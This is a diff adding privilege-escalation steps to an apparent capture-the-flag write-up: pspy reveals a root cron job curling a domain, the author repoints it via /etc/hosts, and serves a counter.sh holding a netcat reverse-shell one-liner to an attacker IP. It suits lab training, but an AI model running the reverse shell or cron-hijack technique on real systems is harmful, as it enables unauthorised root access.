@@ -52,6 +52,28 @@
 ### Used `sudo -l` but got nothing interesting , so searched for our first flag but showing permission denied so i copied it to `/tmp` to see as in tmp dir every permission are given .
 <img width="1920" height="741" alt="first-flag" src="https://github.com/user-attachments/assets/50c26034-b737-4a85-a784-228673de3d8b" />
 
+### Next there is a tool called `pspy` which snoops on running processes without needing root (sudo) privileges . 
+### Download the tool from this https://github.com/dominicbreuker/pspy .
+### Send that file to the target , and enable permission using `chmod` , and run it .
+<img width="1920" height="719" alt="pspy" src="https://github.com/user-attachments/assets/c7cb1ca7-afa3-4131-a356-ab9012c5e67d" />
+
+### As we can see its using curl with a domain name name `mkingdom.thm` . 
+### So we need to edit the `/etc/hosts` file with our tun0 ip so it connects a reverse shell with our ip .
+### First , background the mario's shell by Ctrl+Z . And in your terminal type `stty raw -echo; fg` , to get a clear working shell so that we can edit the hosts file .
+<img width="1920" height="866" alt="getting-working-shell" src="https://github.com/user-attachments/assets/ff7cbf13-5fd1-462d-bf0a-97dede77094c" />
+
+### Then type `export TERM=xterm` , then `nano /etc/hosts` , and edit the mkingdom.thm ip with your tun0 ip .
+<img width="1920" height="388" alt="updating-/etc/hosts" src="https://github.com/user-attachments/assets/29e36bc4-811c-4353-83b9-57aac0842f62" />
+
+### Then open another terminal and create same directory as we saw on the mario's shell , make the files accordingly by the below screenshot .
+<img width="1920" height="558" alt="creating-dir" src="https://github.com/user-attachments/assets/178ec73c-ca76-4116-bba7-17b23193374a" />
+
+### In the counter.sh file give a reverse shell command `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <ATTACKER_IP> <PORT> >/tmp/f` , and save it .
+
+### Now we need to start a http.server so that whenever , we get 200 status code , we'll get the root shell .
+### Start with `python3 -m http.server 85` , and start a listener on another terminal with port 85 . After some minutes when it authenticate to 200 code , you'll get root shell .
+
+<img width="850" height="207" alt="root" src="https://github.com/user-attachments/assets/ed0d2d4b-262d-4f0f-9438-c3ac76a53daa" />
 
 
 
